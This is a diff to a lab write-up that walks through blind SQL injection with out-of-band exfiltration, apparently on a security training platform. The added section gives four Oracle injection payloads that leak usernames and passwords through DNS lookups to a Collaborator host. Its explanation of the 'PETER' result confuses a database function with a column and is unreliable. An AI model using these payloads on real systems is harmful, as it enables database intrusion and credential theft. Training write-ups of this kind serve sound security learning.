@@ -30,9 +30,11 @@ bold = true
 next = true
 +++
 
+
 ## Lab 14: Blind SQL injection with out-of-band data exfiltration: {#lab-14-blind-sql-injection-with-out-of-band-data-exfiltration}
 
 +Note+:
+
 -   This lab requires burp collaborator to complete which is only available with burpsuite professional, you can easily sign up for a burpsuite professional trial but for some reason they do not accept gmail accounts so use something else.
 -   This also just sometimes doesn't work so you need to retry the same payload.
 
@@ -136,6 +138,47 @@ We have the password prepended to our url in collaborator.
 
 We can now solve the lab.
 ![](/ox-hugo/2025-12-09_09-24.png)
+
+
+#### How This Technique Can Be Used To Enumerate Users ETC. {#how-this-technique-can-be-used-to-enumerate-users-etc-dot}
+
+This technique so far has been great but very specific to this context, e.g. extract this specific users password but else can we use it?
+
+Well we can modify our payload to extract usernames from the database also.
+
+```sql
+' || (SELECT UTL_INADDR.get_host_address((SELECT user FROM users WHERE ROWNUM=1)||'.p7xez95jbhakxrsp1gldrj98ozuqii67.oastify.com')FROM dual)--
+```
+
+By doing so we can see we have extracted the username `PETER`
+![](/ox-hugo/2025-12-09_10-19.png)
+
+Now with this data let's extract Peter's password.
+
+```sql
+' || (SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE ROWNUM=1)||'.p7xez95jbhakxrsp1gldrj98ozuqii67.oastify.com')FROM dual)--
+```
+
+As we can see we get what appears to Peter's password.
+![](/ox-hugo/2025-12-09_10-25.png)
+
+However if we run the below query we do not get a response.
+
+```sql
+' || (SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='PETER')||'.p7xez95jbhakxrsp1gldrj98ozuqii67.oastify.com')FROM dual)--
+```
+
+And if we try Peter's "password" it doesn't work.
+![](/ox-hugo/2025-12-09_10-29.png)
+
+This is because the `users` column is different from the `usernames` column as if we run the below query.
+
+```sql
+' || (SELECT UTL_INADDR.get_host_address((SELECT username FROM users WHERE ROWNUM=1)||'.7t1wlrr1xzw2j9e7ny7vd1vqahg845su.oastify.com')FROM dual)--
+```
+
+We get the `administrator` username as expected.
+![](/ox-hugo/2025-12-09_12-42.png)
 
 
 #### Alternative XXE Payload Option To Extract The Administrators Password VIA OAST: {#alternative-xxe-payload-option-to-extract-the-administrators-password-via-oast}
